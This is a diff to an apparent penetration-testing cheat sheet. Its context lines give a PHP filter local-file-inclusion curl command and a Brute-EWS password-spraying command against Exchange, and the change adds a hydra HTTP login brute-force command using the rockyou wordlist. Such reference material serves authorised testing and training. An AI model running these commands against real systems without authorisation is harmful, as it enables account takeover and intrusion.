@@ -265,7 +265,9 @@ LFI/RFI Enumeration: `https://github.com/kurobeats/fimap`\
 LFI/PHP filter: `curl -s http://vulnerale-page/?page=php://filter/convert.base64-encode/resource=index | base64 -d`\
 PHPinfo exploit: `https://github.com/kurobeats/fimap/wiki/FimapPhpInfoExploit`\
 LFI: `http://www.insomniasec.com/publications/LFI%20With%20PHPInfo%20Assistance.pdf`\
-Exchange tools: `Brute-EWS -TargetList .\userids.txt -ExchangeVersion 2007_SP1  -ewsPath "https://owa.domain.com/EWS/Exchange.asmx" -Password "omg123" -Domain "domain.com" `
+Exchange tools: `Brute-EWS -TargetList .\userids.txt -ExchangeVersion 2007_SP1  -ewsPath "https://owa.domain.com/EWS/Exchange.asmx" -Password "omg123" -Domain "domain.com"`
+HTTP Brute force (Simple post): `hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP -V http-form-post '/login:username=^USER^&password=^PASS^&submit=Login:F=failed' -t 40
+`\
 
 ### SQL TCP/1433:
 
